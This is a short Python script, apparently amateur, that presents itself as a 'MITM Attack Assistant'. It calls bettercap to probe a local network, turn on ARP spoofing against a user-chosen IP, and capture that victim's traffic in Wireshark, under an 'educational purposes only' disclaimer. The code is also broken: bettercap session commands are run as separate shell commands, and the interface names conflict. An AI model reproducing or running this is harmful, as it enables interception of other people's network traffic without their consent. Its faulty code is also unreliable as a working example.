import os
import subprocess

#ITS ONLY FOR EDUCATIONAL PURPOUSES ONLY!!!!
#code Made By Maskie
#Status: Not Tested On Linux, AND NO IT DOSENT WORK ON WINDOWS

print('Welcome To MITM Attack Assistant')
print('If you Dont Know What it is Dont Use It')

next = input('Go Next (Y/N): ')
if next == 'Y':
    init1 = 'sudo bettercap -iface eth0'
    os.system(init1)
    probe = 'net.probe on'
    os.system(probe)
    show = 'net.show'
    os.system(show)
    fullduplexmode = 'set arp.spoof.fullduplex true'
    os.system(fullduplexmode)
    targets = input('IP to atack From Network: ')
    print(targets)#I Think That it will be problem eh who cares i will debug it anyway
    result = subprocess.run(['arp.spoof.targets', targets])
    if result.returncode == 0:
        print(f'Started Open Wireshark and select on wlan0')
        print(f'or other wifi card and type in the wireshark search: ip.src == {targets}')
else:
    print('Bye')
